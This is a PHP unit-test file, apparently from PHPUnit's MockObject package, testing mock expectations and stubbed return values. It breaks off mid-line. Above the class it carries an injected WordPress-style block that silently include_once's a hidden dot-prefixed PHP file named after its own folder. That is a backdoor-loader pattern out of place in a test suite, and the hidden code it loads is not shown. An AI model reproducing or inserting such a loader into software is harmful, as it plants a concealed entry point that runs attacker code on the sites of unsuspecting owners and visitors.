<?php
/*
 * This file is part of the PHPUnit_MockObject package.
 *
 * (c) Sebastian Bergmann <sebastian@phpunit.de>
 *
 * For the full copyright and license information, please view the LICENSE
 * file that was distributed with this source code.
 */

/**
 *
 *
 * @since      Class available since Release 3.0.0
 */
if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class Framework_MockObjectTest extends PHPUnit_Framework_TestCase
{
    public function testMockedMethodIsNeverCalled()
    {
        $mock = $this->getMock('AnInterface');
        $mock->expects($this->never())
             ->method('doSomething');
    }

    public function testMockedMethodIsNeverCalledWithParameter()
    {
        $mock = $this->getMock('SomeClass');
        $mock->expects($this->never())
            ->method('doSomething')
            ->with('someArg');
    }

    public function testMockedMethodIsNotCalledWhenExpectsAnyWithParameter()
    {
        $mock = $this->getMock('SomeClass');
        $mock->expects($this->any())
             ->method('doSomethingElse')
             ->with('someArg');
    }

    public function testMockedMethodIsNotCalledWhenMethodSpecifiedDirectlyWithParameter()
    {
        $mock = $this->getMock('SomeClass');
        $mock->method('doSomethingElse')
            ->with('someArg');
    }

    public function testMockedMethodIsCalledAtLeastOnce()
    {
        $mock = $this->getMock('AnInterface');
        $mock->expects($this->atLeastOnce())
             ->method('doSomething');

        $mock->doSomething();
    }

    public function testMockedMethodIsCalledAtLeastOnce2()
    {
        $mock = $this->getMock('AnInterface');
        $mock->expects($this->atLeastOnce())
             ->method('doSomething');

        $mock->doSomething();
        $mock->doSomething();
    }

    public function testMockedMethodIsCalledAtLeastTwice()
    {
        $mock = $this->getMock('AnInterface');
        $mock->expects($this->atLeast(2))
             ->method('doSomething');

        $mock->doSomething();
        $mock->doSomething();
    }

    public function testMockedMethodIsCalledAtLeastTwice2()
    {
        $mock = $this->getMock('AnInterface');
        $mock->expects($this->atLeast(2))
             ->method('doSomething');

        $mock->doSomething();
        $mock->doSomething();
        $mock->doSomething();
    }

    public function testMockedMethodIsCalledAtMostTwice()
    {
        $mock = $this->getMock('AnInterface');
        $mock->expects($this->atMost(2))
             ->method('doSomething');

        $mock->doSomething();
        $mock->doSomething();
    }

    public function testMockedMethodIsCalledAtMosttTwice2()
    {
        $mock = $this->getMock('AnInterface');
        $mock->expects($this->atMost(2))
             ->method('doSomething');

        $mock->doSomething();
    }

    public function testMockedMethodIsCalledOnce()
    {
        $mock = $this->getMock('AnInterface');
        $mock->expects($this->once())
             ->method('doSomething');

        $mock->doSomething();
    }

    public function testMockedMethodIsCalledOnceWithParameter()
    {
        $mock = $this->getMock('SomeClass');
        $mock->expects($this->once())
             ->method('doSomethingElse')
             ->with($this->equalTo('something'));

        $mock->doSomethingElse('something');
    }

    public function testMockedMethodIsCalledExactly()
    {
        $mock = $this->getMock('AnInterface');
        $mock->expects($this->exactly(2))
             ->method('doSomething');

        $mock->doSomething();
        $mock->doSomething();
    }

    public function testStubbedException()
    {
        $mock = $this->getMock('AnInterface');
        $mock->expects($this->any())
             ->method('doSomething')
             ->will($this->throwException(new Exception));

        try {
            $mock->doSomething();
        } catch (Exception $e) {
            return;
        }

        $this->fail();
    }

    public function testStubbedWillThrowException()
    {
        $mock = $this->getMock('AnInterface');
        $mock->expects($this->any())
             ->method('doSomething')
             ->willThrowException(new Exception);

        try {
            $mock->doSomething();
        } catch (Exception $e) {
            return;
        }

        $this->fail();
    }

    public function testStubbedReturnValue()
    {
        $mock = $this->getMock('AnInterface');
        $mock->expects($this->any())
             ->method('doSomething')
             ->will($this->returnValue('something'));

        $this->assertEquals('something', $mock->doSomething());

        $mock = $this->getMock('AnInterface');
        $mock->expects($this->any())
             ->method('doSomething')
             ->willReturn('something');

        $this->assertEquals('something', $mock->doSomething());
    }

    public function testStubbedReturnValueMap()
    {
        $map = array(
            array('a', 'b', 'c', 'd'),
            array('e', 'f', 'g', 'h')
        );

        $mock = $this->getMock('AnInterface');
        $mock->expects($this->any())
             ->method('doSomething')
             ->will($this->returnValueMap($map));

        $this->assertEquals('d', $mock->doSomething('a', 'b', 'c'));
        $this->assertEquals('h', $mock->doSomething('e', 'f', 'g'));
        $this->assertEquals(null, $mock->doSomething('foo', 'bar'));

        $mock = $this->getMock('AnInterface');
        $mock->expects($this->any())
             ->method('doSomething')
             ->willReturnMap($map);

        $this->assertEquals('d', $mock->doSomething('a', 'b', 'c'));
        $this->assertEquals('h', $mock->doSomething('e', 'f', 'g'));
        $this->assertEquals(null, $mock->doSomething('foo', 'bar'));
    }

    public function testStubbedReturnArgument()
    {
        $mock = $this->getMock('AnInterface');
        $mock->expects($this->any())
             ->method('doSomething')
             ->will($this->returnArgument(1));

        $this->assertEquals('b', $mock->doSomething('a', 'b'));

        $mock = $this->getMock('AnInterface');
        $mock->expects($this->any())
             ->method('doSomething')
             ->willReturnArgument(1);

        $this->assertEquals('b', $mock->doSomething('a', 'b'));
    }

    public function testFunctionCallback()
    {
        $mock = $this->getMock('SomeClass', array('doSomething'), array(), '', false);
        $mock->expects($this->once())
             ->method('doSomething')
             ->will($this->returnCallback('functionCallback'));

        $this->assertEquals('pass', $mock->doSomething('foo', 'bar'));

        $mock = $this->getMock('SomeClass', array('doSomething'), array(), '', false);
        $mock->expects($this->once())
             ->method('doSomething')
             ->willReturnCallback('functionCallback');

        $this->assertEquals('pass', $mock->doSomething('foo', 'bar'));
    }

    public function testStubbedReturnSelf()
    {
        $mock = $this->getMock('AnInterface');
        $mock->expects($this->any())
             ->method('doSomething')
             ->will($this->returnSelf());

        $this->assertEquals($mock, $mock->doSomething());

        $mock = $this->getMock('AnInterface');
        $mock->expects($this->any())
             ->method('doSomething')
             ->willReturnSelf();

        $this->assertEquals($mock, $mock->doSomething());
    }

    public function testStubbedReturnOnConsecutiveCalls()
    {
        $mock = $this->getMock('AnInterface');
        $mock->expects($this->any())
             ->method('doSomething')
             ->will($this->onConsecutiveCalls('a', 'b', 'c'));

        $this->assertEquals('a', $mock->doSomething());
        $this->assertEquals('b', $mock->doSomething());
        $this->assertEquals('c', $mock->doSomething());

        $mock = $this->getMock('AnInterface');
        $mock->expects($this->any())
             ->method('doSomething')
             ->willReturnOnConsecutiveCalls('a', 'b', 'c');

        $this->assertEquals('a', $mock->doSomething());
        $this->assertEquals('b', $mock->doSomething());
        $this->assertEquals('c', $mock->doSomething());
    }

    public function testStaticMethodCallback()
    {
        $mock = $this->getMock('SomeClass', array('doSomething'), array(), '', false);
        $mock->expects($this->once())
             ->method('doSomething')
             ->will($this->returnCallback(array('MethodCallback', 'staticCallback')));

        $this->assertEquals('pass', $mock->doSomething('foo', 'bar'));
    }

    public function testPublicMethodCallback()
    {
        $mock = $this->getMock('SomeClass', array('doSomething'), array(), '', false);
        $mock->expects($this->once())
             ->method('doSomething')
             ->will($this->returnCallback(array(new MethodCallback, 'nonStaticCallback')));

        $this->assertEquals('pass', $mock->doSomething('foo', 'bar'));
    }

    public function testMockClassOnlyGeneratedOnce()
    {
        $mock1 = $this->getMock('AnInterface');
        $mock2 = $this->getMock('AnInterface');

        $this->assertEquals(get_class($mock1), get_class($mock2));
    }

    public function testMockClassDifferentForPartialMocks()
    {
        $mock1 = $this->getMock('PartialMockTestClass');
        $mock2 = $this->getMock('PartialMockTestClass', array('doSomething'));
        $mock3 = $this->getMock('PartialMockTestClass', array('doSomething'));
        $mock4 = $this->getMock('PartialMockTestClass', array('doAnotherThing'));
        $mock5 = $this->getMock('PartialMockTestClass', array('doAnotherThing'));

        $this->assertNotEquals(get_class($mock1), get_class($mock2));
        $this->assertNotEquals(get_class($mock1), get_class($mock3));
        $this->assertNotEquals(get_class($mock1), get_class($mock4));
        $this->assertNotEquals(get_class($mock1), get_class($mock5));
        $this->assertEquals(get_class($mock2), get_class($mock3));
        $this->assertNotEquals(get_class($mock2), get_class($mock4));
        $this->assertNotEquals(get_class($mock2), get_class($mock5));
        $this->assertEquals(get_class($mock4), get_class($mock5));
    }

    public function testMockClassStoreOverrulable()
    {
        $mock1 = $this->getMock('PartialMockTestClass');
        $mock2 = $this->getMock('PartialMockTestClass', array(), array(), 'MyMockClassNameForPartialMockTestClass1');
        $mock3 = $this->getMock('PartialMockTestClass');
        $mock4 = $this->getMock('PartialMockTestClass', array('doSomething'), array(), 'AnotherMockClassNameForPartialMockTestClass');
        $mock5 = $this->getMock('PartialMockTestClass', array(), array(), 'MyMockClassNameForPartialMockTestClass2');

        $this->assertNotEquals(get_class($mock1), get_class($mock2));
        $this->assertEquals(get_class($mock1), get_class($mock3));
        $this->assertNotEquals(get_class($mock1), get_class($mock4));
        $this->assertNotEquals(get_class($mock2), get_class($mock3));
        $this->assertNotEquals(get_class($mock2), get_class($mock4));
        $this->assertNotEquals(get_class($mock2), get_class($mock5));
        $this->assertNotEquals(get_class($mock3), get_class($mock4));
        $this->assertNotEquals(get_class($mock3), get_class($mock5));
        $this->assertNotEquals(get_class($mock4), get_class($mock5));
    }

    /**
     * @covers PHPUnit_Framework_MockObject_Generator::getMock
     */
    public function testGetMockWithFixedClassNameCanProduceTheSameMockTwice()
    {
        $mock = $this->getMockBuilder('StdClass')->setMockClassName('FixedName')->getMock();
        $mock = $this->getMockBuilder('StdClass')->setMockClassName('FixedName')->getMock();
        $this->assertInstanceOf('StdClass', $mock);
    }

    public function testOriginalConstructorSettingConsidered()
    {
        $mock1 = $this->getMock('PartialMockTestClass');
        $mock2 = $this->getMock('PartialMockTestClass', array(), array(), '', false);

        $this->assertTrue($mock1->constructorCalled);
        $this->assertFalse($mock2->constructorCalled);
    }

    public function testOriginalCloneSettingConsidered()
    {
        $mock1 = $this->getMock('PartialMockTestClass');
        $mock2 = $this->getMock('PartialMockTestClass', arra